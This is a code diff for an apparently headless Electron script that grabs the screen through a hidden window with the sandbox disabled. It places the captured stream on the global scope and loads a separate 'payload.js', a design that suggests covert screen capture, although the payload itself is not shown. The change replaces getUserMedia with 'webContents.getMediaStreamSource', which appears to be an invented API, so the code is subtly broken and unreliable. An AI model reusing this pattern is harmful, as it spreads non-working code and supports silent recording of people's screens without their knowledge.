@@ -1,17 +1,25 @@
-// index.js - The Bridge
-const { app, desktopCapturer, screen } = require('electron');
+// index.js
+const { app, desktopCapturer, BrowserWindow } = require('electron');
 const path = require('path');
 
-// Ensure we have a display context even in headless mode
 app.commandLine.appendSwitch('no-sandbox');
 app.commandLine.appendSwitch('disable-gpu');
+app.commandLine.appendSwitch('enable-features', 'VizDisplayCompositor');
 
 let localStream = null;
 
 async function init() {
     await app.whenReady();
     
-    // --- SCREEN CAPTURE LOGIC ---
+    // Create a hidden window to act as the render context for capture
+    const win = new BrowserWindow({ 
+        show: false,
+        width: 1920,
+        height: 1080
+    });
+    
+    await win.loadURL('about:blank');
+
     try {
         const sources = await desktopCapturer.getSources({ 
             types: ['screen', 'window'],
@@ -20,12 +28,10 @@ async function init() {
         
         if (sources.length === 0) throw new Error("No display found");
         
-        // Get the first screen source
         const source = sources.find(s => s.name.includes('Screen')) || sources[0];
         
-        // Create a MediaStream from the source using the built-in API
-        // This makes 'navigator.mediaDevices' work naturally
-        localStream = await navigator.mediaDevices.getUserMedia({
+        // Use the window's webContents to get the media stream
+        localStream = await win.webContents.getMediaStreamSource({
             audio: false,
             video: {
                 mandatory: {
@@ -44,12 +50,9 @@ async function init() {
         console.error("[ELECTRON] Capture failed:", err.message);
     }
 
-    // Load your actual payload logic
-    // We expose 'localStream' and 'desktopCapturer' to the global scope so payload.js can use them
     global.electronLocalStream = localStream;
     global.desktopCapturer = desktopCapturer;
     
-    // Start your main payload logic
     require('./payload.js');
 }
 
